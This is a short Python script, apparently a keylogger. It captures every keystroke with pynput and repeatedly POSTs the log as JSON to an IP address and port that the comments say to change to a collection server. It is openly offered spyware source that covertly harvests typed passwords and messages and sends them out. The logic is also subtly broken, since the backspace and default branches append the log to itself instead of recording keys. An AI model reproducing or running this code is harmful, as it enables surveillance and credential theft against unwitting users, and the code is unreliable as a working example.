from pynput import keyboard
import requests
import json
import threading

keylog = ""

# ip address and port number we want to send post requests to
ip_address = "127.0.0.1" #CHANGE THIS
port = "8000" #CHANGE THIS

#time interval betweeen post requests
timer_interval = 10 #CHANGE THIS IF NEEDED


#logging the key to global variable
def key_logging(key):
    global keylog
    
    #taking care of some special characters
    if key == keyboard.Key.enter:
        keylog += "\n"
    elif key == keyboard.Key.space:
        keylog += " "
    elif key == keyboard.Key.backspace and len(keylog) > 0:
        keylog += keylog[:-1]
    
    #removing quotes from strings
    else:
        keylog += str(keylog).strip("'")


#function to send post request to server
def send_post_request():
    try:
        #converting logs to json
        payload = json.dumps({"KeyboardInput": keylog})
        
        #crafting the post request
        req = requests.post(f"http://{ip_address}:{port}", data=payload, headers={"Content-Type": "application/json"})
        
        #setting the timer
        timer = threading.Timer(timer_interval, send_post_request)
        timer.start()

    except:
        print("ERROR! Couldn't send request.")

#logging keys and sending the request to server
with keyboard.Listener(on_press=key_logging) as listener:
    send_post_request()
    listener.join()
